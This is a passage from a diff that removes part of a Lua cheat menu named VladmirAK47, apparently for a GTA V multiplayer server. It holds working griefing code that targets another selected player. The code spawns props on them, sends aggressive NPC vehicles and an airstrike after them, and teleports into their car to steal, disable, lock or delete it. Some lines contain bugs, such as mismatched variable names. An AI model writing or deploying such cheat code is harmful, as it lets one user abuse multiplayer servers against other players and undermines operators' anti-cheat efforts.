- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2) 				
-				local bH1 = CreateObject(GetHashKey('stt_prop_stunt_soccer_sball'), oS.x, oS.y, oS.z, true, true, true)
-				elseif VladmirAK47.Button('~h~Big stunt jump') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2) 				
-				local bH1 = CreateObject(GetHashKey('stt_prop_stunt_track_jump'), oS.x, oS.y, oS.z, true, true, true)
-                   FreezeEntityPosition(bH1, true)
-				elseif VladmirAK47.Button('~h~Grave') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2) 				
-				local bH1 = CreateObject(GetHashKey('test_prop_gravestones_09a'), oS.x, oS.y, oS.z, true, true, true)
-                   FreezeEntityPosition(bH1, true)
-				elseif VladmirAK47.Button('~h~Dead guy') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2) 				
-				local bH1 = CreateObject(GetHashKey('prop_ped_gib_01'), oS.x, oS.y, oS.z, true, true, true)
-                   FreezeEntityPosition(BH1, true)
-				elseif VladmirAK47.Button('~h~Arcade') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2) 				
-				local bH1 = CreateObject(GetHashKey('prop_arcade_02'), oS.x, oS.y, oS.z, true, true, true)
-                   FreezeEntityPosition(BH1, true)
-				elseif VladmirAK47.Button('~h~Yacht') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2) 				
-				local bH1 = CreateObject(GetHashKey('apa_mp_apa_yacht'), oS.x, oS.y, oS.z, true, true, true)
-                   FreezeEntityPosition(BH1, true)
-				elseif VladmirAK47.Button('~h~Ufo') then
-				local ped1 = GetPlayerPed(SelectedPlayer)
- 	            local oS = GetPedBoneCoords(ped1, 0, 0.0, 0.0, 0.2) 				
-				local bH1 = CreateObject(GetHashKey('p_spinning_anus_s'), oS.x, oS.y, oS.z, true, true, true)
-                   FreezeEntityPosition(BH1, true)				   
-				   
-				end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('Pedstuff') then
-				if VladmirAK47.Button('~h~Police Follow Player') then
-                    local veh = ("Police")
-                    for i = 0, 0 do
-					local target = PlayerPedId(SelectedPlayer)
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
-                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
-                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('a_m_o_acult_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('a_m_o_acult_01') do
-                        RequestModel('a_m_o_acult_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        Citizen.Wait(50)
-                        v =
-                            CreateVehicle(
-                            veh,
-                            pos.x - (xf * 30),
-                            pos.y - (yf * 30),
-                            pos.z + 1,
-                            GetEntityHeading(GetPlayerPed(SelectedPlayer)),
-                            true,
-                            false
-                        )
-                        if DoesEntityExist(v) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('a_m_o_acult_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('a_m_o_acult_01') then
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                local ped1 =
-                                    CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
-                                    SetPedIntoVehicle(ped, v, -1)
-                                    SetPedIntoVehicle(ped1, v, 0)
-                                    TaskVehicleEscort(ped, v, (GetPlayerPed(SelectedPlayer)), -1, 50.0, 1082917029, 7.5, 0, -1)
-                                    SetDriverAbility(ped, 10.0)
-                                    SetDriverAggressiveness(ped, 10.0)
-                                end
-                            end
-                        end
-                    end
-                end								
-				elseif VladmirAK47.Button('~h~Police follow Vehicle') then
-                    local veh = ("Police")
-                    for i = 0, 0 do
-					local target = PlayerPedId(SelectedPlayer)
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
-                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
-                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('a_m_o_acult_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('a_m_o_acult_01') do
-                        RequestModel('a_m_o_acult_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        Citizen.Wait(50)
-                        v =
-                            CreateVehicle(
-                            veh,
-                            pos.x - (xf * 30),
-                            pos.y - (yf * 30),
-                            pos.z + 1,
-                            GetEntityHeading(GetPlayerPed(SelectedPlayer)),
-                            true,
-                            false
-                        )
-                        if DoesEntityExist(v) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('a_m_o_acult_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('a_m_o_acult_01') then
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                local ped1 =
-                                    CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
-                                    SetPedIntoVehicle(ped, v, -1)
-                                    SetPedIntoVehicle(ped1, v, 0)
-                                    TaskVehicleEscort(ped, v, GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)), -1, 50.0, 1082917029, 7.5, 0, -1)
-                                    SetDriverAbility(ped, 10.0)
-                                    SetDriverAggressiveness(ped, 10.0)
-                                end
-                            end
-                        end
-                    end
-                end					
-				elseif VladmirAK47.Button('~h~Heli Follow Player') then
-                    local veh = ("Buzzard")
-                    for i = 0, 0 do
-					local target = PlayerPedId(SelectedPlayer)
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
-                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
-                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('a_m_o_acult_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('a_m_o_acult_01') do
-                        RequestModel('a_m_o_acult_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        Citizen.Wait(50)
-                        v =
-                            CreateVehicle(
-                            veh,
-                            pos.x - (xf * 30),
-                            pos.y - (yf * 30),
-                            pos.z + 820,
-                            GetEntityHeading(GetPlayerPed(SelectedPlayer)),
-                            true,
-                            false
-                        )
-                        if DoesEntityExist(v) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('a_m_o_acult_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('a_m_o_acult_01') then
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                local ped1 =
-                                    CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
-                                    SetPedIntoVehicle(ped, v, -1)
-                                    SetPedIntoVehicle(ped1, v, 0)
-                                    TaskVehicleEscort(ped, v, (GetPlayerPed(SelectedPlayer)), -1, 50.0, 1082917029, 37.5, 0, -1)
-                                    SetDriverAbility(ped, 10.0)
-                                    SetDriverAggressiveness(ped, 10.0)
-                                end
-                            end
-                        end
-                    end
-                end
-				elseif VladmirAK47.Button('~h~Heli Follow Vehicle') then
-                    local veh = ("Buzzard")
-                    for i = 0, 0 do
-					local target = PlayerPedId(SelectedPlayer)
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
-                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
-                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('a_m_o_acult_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('a_m_o_acult_01') do
-                        RequestModel('a_m_o_acult_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        Citizen.Wait(50)
-                        v =
-                            CreateVehicle(
-                            veh,
-                            pos.x - (xf * 30),
-                            pos.y - (yf * 30),
-                            pos.z + 820,
-                            GetEntityHeading(GetPlayerPed(SelectedPlayer)),
-                            true,
-                            false
-                        )
-                        if DoesEntityExist(v) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('a_m_o_acult_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('a_m_o_acult_01') then
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                local ped1 =
-                                    CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
-                                    SetPedIntoVehicle(ped, v, -1)
-                                    SetPedIntoVehicle(ped1, v, 0)
-                                    TaskVehicleEscort(ped, v, GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)), -1, 50.0, 1082917029, 37.5, 0, -1)
-                                    SetDriverAbility(ped, 10.0)
-                                    SetDriverAggressiveness(ped, 10.0)
-                                end
-                            end
-                        end
-                    end
-                end				
-				elseif VladmirAK47.Button('~h~Tank Follow Player') then
-                    local veh = ("Rhino")
-                    for i = 0, 0 do
-					local target = PlayerPedId(SelectedPlayer)
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
-                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
-                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('a_m_o_acult_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('a_m_o_acult_01') do
-                        RequestModel('a_m_o_acult_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        Citizen.Wait(50)
-                        v =
-                            CreateVehicle(
-                            veh,
-                            pos.x - (xf * 90),
-                            pos.y - (yf * 90),
-                            pos.z + 1,
-                            GetEntityHeading(GetPlayerPed(SelectedPlayer)),
-                            true,
-                            false
-                        )
-                        if DoesEntityExist(v) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('a_m_o_acult_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('a_m_o_acult_01') then
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                local ped1 =
-                                    CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
-                                    SetPedIntoVehicle(ped, v, -1)
-                                    SetPedIntoVehicle(ped1, v, 0)
-                                    TaskVehicleEscort(ped, v, (GetPlayerPed(SelectedPlayer)), -1, 250.0, 1082917029, 7.5, 0, -1)
-                                    SetDriverAbility(ped, 10.0)
-                                    SetDriverAggressiveness(ped, 10.0)
-                                end
-                            end
-                        end
-                    end
-                end	
-				elseif VladmirAK47.Button('~h~Tank Follow Vehicle') then
-                    local veh = ("Rhino")
-                    for i = 0, 0 do
-					local target = PlayerPedId(SelectedPlayer)
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
-                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
-                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('a_m_o_acult_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('a_m_o_acult_01') do
-                        RequestModel('a_m_o_acult_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        Citizen.Wait(50)
-                        v =
-                            CreateVehicle(
-                            veh,
-                            pos.x - (xf * 90),
-                            pos.y - (yf * 90),
-                            pos.z + 1,
-                            GetEntityHeading(GetPlayerPed(SelectedPlayer)),
-                            true,
-                            false
-                        )
-                        if DoesEntityExist(v) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('a_m_o_acult_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('a_m_o_acult_01') then
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                local ped1 =
-                                    CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
-                                    SetPedIntoVehicle(ped, v, -1)
-                                    SetPedIntoVehicle(ped1, v, 0)
-                                    TaskVehicleEscort(ped, v, GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)), -1, 7.5, 1082917029, 7.5, 0, -1)
-                                    SetDriverAbility(ped, 10.0)
-                                    SetDriverAggressiveness(ped, 10.0)
-                                end
-                            end
-                        end
-                    end
-                end
-				elseif VladmirAK47.Button('~h~ClownGang Follow Vehicle') then
-                    local veh = ("Speedo2")
-                    for i = 0, 0 do
-					local target = PlayerPedId(SelectedPlayer)
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
-                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
-                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('a_m_o_acult_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('a_m_o_acult_01') do
-                        RequestModel('a_m_o_acult_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        Citizen.Wait(50)
-                        v =
-                            CreateVehicle(
-                            veh,
-                            pos.x - (xf * 100),
-                            pos.y - (yf * 100),
-                            pos.z + 1,
-                            GetEntityHeading(GetPlayerPed(SelectedPlayer)),
-                            true,
-                            false
-                        )
-                        if DoesEntityExist(v) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('a_m_o_acult_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('a_m_o_acult_01') then
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                local ped1 =
-                                    CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
-                                    SetPedIntoVehicle(ped, v, -1)
-                                    SetPedIntoVehicle(ped1, v, 0)
-                                    TaskVehicleEscort(ped, v, GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)), -1, 7.5, 1082917029, 7.5, 0, -1)
-                                    SetDriverAbility(ped, 10.0)
-                                    SetDriverAggressiveness(ped, 10.0)
-                                end
-                            end
-                        end
-                    end
-                end	
-				elseif VladmirAK47.Button('~h~Plane fly above him') then
-                    local veh = ("Shamal")
-                    for i = 0, 0 do
-					local target = GetPlayerPed(SelectedPlayer)
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
-                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
-                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('a_m_o_acult_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('a_m_o_acult_01') do
-                        RequestModel('a_m_o_acult_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        Citizen.Wait(50)
-                        v =
-                            CreateVehicle(
-                            veh,
-                            pos.x - (xf * 90),
-                            pos.y - (yf * 90),
-                            pos.z + 700,
-                            GetEntityHeading(GetPlayerPed(SelectedPlayer)),
-                            true,
-                            false
-                        )
-						local v1 = CreateVehicle(veh, pos.x + 300, pos.y, pos.z + 800, GetEntityHeading(target), true, true)
-                        if DoesEntityExist(v) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('a_m_o_acult_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('a_m_o_acult_01') then
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                local ped1 =
-                                    CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
-                                    SetPedIntoVehicle(ped, v, -1)
-                                    SetPedIntoVehicle(ped1, v1, -1)
-                                    TaskPlaneChase(ped, GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)), 100.00, 786468)
-									TaskPlaneChase(ped1, (GetPlayerPed(SelectedPlayer)), 100.00, 786468)
-                                    SetDriverAbility(ped, 10.0)
-                                    SetDriverAggressiveness(ped, 10.0)
-									SetDriverAbility(ped1, 10.0)
-                                    SetDriverAggressiveness(ped1, 10.0)
-                                end
-                            end
-                        end
-                    end
-                end
-				elseif VladmirAK47.Button('~h~AirStrike Attack') then
-                    local veh = ("lazer")
-                    for i = 0, 0 do
-					local target = GetPlayerPed(SelectedPlayer)
-                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
-                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
-                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
-                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
-                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
-                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
-                    local v = nil
-                    RequestModel(veh)
-                    RequestModel('a_m_o_acult_01')
-                    while not HasModelLoaded(veh) and not HasModelLoaded('a_m_o_acult_01') do
-                        RequestModel('a_m_o_acult_01')
-                        Citizen.Wait(0)
-                        RequestModel(veh)
-                    end
-                    if HasModelLoaded(veh) then
-                        Citizen.Wait(50)
-                        v =
-                            CreateVehicle(
-                            veh,
-                            pos.x - (xf * 90),
-                            pos.y - (yf * 90),
-                            pos.z + 700,
-                            GetEntityHeading(GetPlayerPed(SelectedPlayer)),
-                            true,
-                            false
-                        )
-						local v1 = CreateVehicle(veh, pos.x + 300, pos.y, pos.z + 600, GetEntityHeading(target), true, true)
-                        if DoesEntityExist(v) then
-                            NetworkRequestControlOfEntity(v)
-                            SetVehicleDoorsLocked(v, 4)
-                            RequestModel('a_m_o_acult_01')
-                            Citizen.Wait(50)
-                            if HasModelLoaded('a_m_o_acult_01') then
-                                Citizen.Wait(50)
-                                local ped = CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                local ped1 =
-                                    CreatePed(21, GetHashKey('a_m_o_acult_01'), pos.x, pos.y, pos.z, true, true)
-                                if DoesEntityExist(ped1) and DoesEntityExist(ped) then
-                                    SetPedIntoVehicle(ped, v, -1)
-                                    SetPedIntoVehicle(ped1, v1, -1)
-                                    TaskPlaneChase(ped, GetVehiclePedIsUsing(GetPlayerPed(SelectedPlayer)), 100.00, 786468)
-									TaskPlaneChase(ped1, (GetPlayerPed(SelectedPlayer)), 100.00, 786468)
-                                    SetDriverAbility(ped, 10.0)
-                                    SetDriverAggressiveness(ped, 10.0)
-									SetDriverAbility(ped1, 10.0)
-                                    SetDriverAggressiveness(ped1, 10.0)
-									TaskCombatPed(ped, target, 0, 16)
-								    TaskCombatPed(ped1, target, 0, 16)
-								    SetPedKeepTask(ped, true)
-								    SetPedKeepTask(ped1, true)
-                                end
-                            end
-                        end
-                    end
-                end						
-                end				
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('VehicleOptions') then
-				if VladmirAK47.Button('~h~Steal his car') then
-				    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
-					 NetworkSetInSpectatorMode(false, GetPlayerPed(-1))
-					 local ped = GetPlayerPed(-1)
-					 local target = GetPlayerPed(SelectedPlayer)
-                     local pos = GetEntityCoords(target)
-                     local vehicle = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
-                     local cM = GetEntityCoords(GetPlayerPed(-1))					 
-                     d4 = false	
-					 SetEntityCoords(ped, pos.x, pos.y + 45, pos.z - 4)				 
-					 ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
-					 Citizen.Wait(1000)					 
-                     SetPedIntoVehicle(PlayerPedId(-1), vehicle, -1)
-					 Citizen.Wait(1000)
-                      local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
-                      SetEntityCoords(Entity, cM.x, cM.y, cM.z, 0.0, 0.0, 0.0, false)
-					  d4 = true
-                    else
-                        av('~h~~b~Player not in a vehicle~s~.', false)					  
-                    end	
-				elseif VladmirAK47.Button('~h~Break his Engine') then
-				    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
-					 NetworkSetInSpectatorMode(false, GetPlayerPed(-1))
-					 local ped = GetPlayerPed(-1)
-					 local target = GetPlayerPed(SelectedPlayer)
-                     local pos = GetEntityCoords(target)
-                     local vehicle = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
-                     local cM = GetEntityCoords(GetPlayerPed(-1))					 
-                     d4 = false	
-					 SetEntityCoords(ped, pos.x, pos.y, pos.z - 4)				 
-					 ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
-					 Citizen.Wait(1000)					 
-                     SetPedIntoVehicle(PlayerPedId(-1), vehicle, -1)
-					 Citizen.Wait(4000)
-                     SetVehicleEngineHealth(vehicle, 0)
-                     SetVehicleUndriveable(vehicle, true)					 
-					 Citizen.Wait(1000)
-                      SetEntityCoords(ped, cM.x, cM.y, cM.z, 0.0, 0.0, 0.0, false)
-					  d4 = true
-                    else
-                        av('~h~~b~Player not in a vehicle~s~.', false)					  
-                    end
-				elseif VladmirAK47.Button('~h~Burst his Vehicle') then
-				    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
-					 NetworkSetInSpectatorMode(false, GetPlayerPed(-1))
-					 local ped = GetPlayerPed(-1)
-					 local target = GetPlayerPed(SelectedPlayer)
-                     local pos = GetEntityCoords(target)
-                     local vehicle = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
-                     local cM = GetEntityCoords(GetPlayerPed(-1))					 
-                     d4 = false	
-					 SetEntityCoords(ped, pos.x, pos.y, pos.z - 4)				 
-					 ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
-					 Citizen.Wait(1000)					 
-                     SetPedIntoVehicle(PlayerPedId(-1), vehicle, -1)
-					 Citizen.Wait(4000)
-                       SetVehicleTyreBurst(vehicle, 0, true, 1000.0)
-                       SetVehicleTyreBurst(vehicle, 1, true, 1000.0)
-                       SetVehicleTyreBurst(vehicle, 2, true, 1000.0)
-                        SetVehicleTyreBurst(vehicle, 3, true, 1000.0)
-                        SetVehicleTyreBurst(vehicle, 4, true, 1000.0)
-                        SetVehicleTyreBurst(vehicle, 5, true, 1000.0)
-                        SetVehicleTyreBurst(vehicle, 4, true, 1000.0)
-                        SetVehicleTyreBurst(vehicle, 7, true, 1000.0)					 
-					 Citizen.Wait(1000)
-                      SetEntityCoords(ped, cM.x, cM.y, cM.z, 0.0, 0.0, 0.0, false)
-					  d4 = true
-                    else
-                        av('~h~~b~Player not in a vehicle~s~.', false)					  
-                    end					
-				elseif VladmirAK47.Button('~h~Make his Car Pink') then
-				    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
-					 NetworkSetInSpectatorMode(false, GetPlayerPed(-1))
-					 local ped = GetPlayerPed(-1)
-					 local target = GetPlayerPed(SelectedPlayer)
-                     local pos = GetEntityCoords(target)
-                     local vehicle = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
-                     local cM = GetEntityCoords(GetPlayerPed(-1))
-                     d4 = false					 
-                     --SetEntityCoords(ped, pos)
-					 SetEntityCoords(ped, pos.x, pos.y, pos.z - 4)				 
-					 ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
-					 Citizen.Wait(1000)					 
-                     SetPedIntoVehicle(PlayerPedId(-1), vehicle, -1)
-					 Citizen.Wait(4000)
-                     SetVehicleColours(vehicle, 135, 135)					 
-					 Citizen.Wait(1000)
-                      SetEntityCoords(ped, cM.x, cM.y, cM.z, 0.0, 0.0, 0.0, false)
-					  d4 = true
-                    else
-                        av('~h~~b~Player not in a vehicle~s~.', false)					  
-                    end	
-				elseif VladmirAK47.Button('~h~Lock his Vehicle') then	
-				    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
-                     NetworkSetInSpectatorMode(false, GetPlayerPed(-1))
-					 local ped = GetPlayerPed(-1)
-					 local target = GetPlayerPed(SelectedPlayer)
-                     local pos = GetEntityCoords(target)
-                     local vehicle = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
-                     local cM = GetEntityCoords(GetPlayerPed(-1))					 
-                     d4 = false
-					 SetEntityCoords(ped, pos.x, pos.y + 45, pos.z - 4)				 
-					 ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
-					 Citizen.Wait(1000)					 
-                     SetPedIntoVehicle(PlayerPedId(-1), vehicle, -1)
-					 Citizen.Wait(5000)
-                      local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
-                        SetVehicleDoorsLocked(vehicle, 4)
-					  Citizen.Wait(1000)
-					  SetEntityCoords(ped, cM.x, cM.y, cM.z, 0.0, 0.0, 0.0, false)
-					  d4 = true
-                    else
-                        av('~h~~b~Player not in a vehicle~s~.', false)					  
-                    end					 					
-				elseif VladmirAK47.Button('~h~Delete his Vehicle') then
-				    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
-                     NetworkSetInSpectatorMode(false, GetPlayerPed(-1))
-					 local ped = GetPlayerPed(-1)
-					 local target = GetPlayerPed(SelectedPlayer)
-                     local pos = GetEntityCoords(target)
-                     local vehicle = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), true)
-                     local cM = GetEntityCoords(GetPlayerPed(-1))					 
-                     d4 = false
-					 SetEntityCoords(ped, pos.x, pos.y + 45, pos.z - 4)				 
-					 ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
-					 Citizen.Wait(1000)					 
-                     SetPedIntoVehicle(PlayerPedId(-1), vehicle, -1)
-					 Citizen.Wait(1000)
-                      local Entity = IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
-                      SetEntityCoords(Entity, 1234, 1234, 700, 0.0, 0.0, 0.0, false)
-					  Citizen.Wait(1000)
-					  ClearPedTasksImmediately(GetPlayerPed(-1))
-					  Citizen.Wait(1000)
-					  SetEntityCoords(ped, cM.x, cM.y, cM.z, 0.0, 0.0, 0.0, false)
-					  d4 = true
-                    else
-                        av('~h~~b~Player not in a vehicle~s~.', false)					  
-                    end					 
-				end						
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('Trollmenu') then 
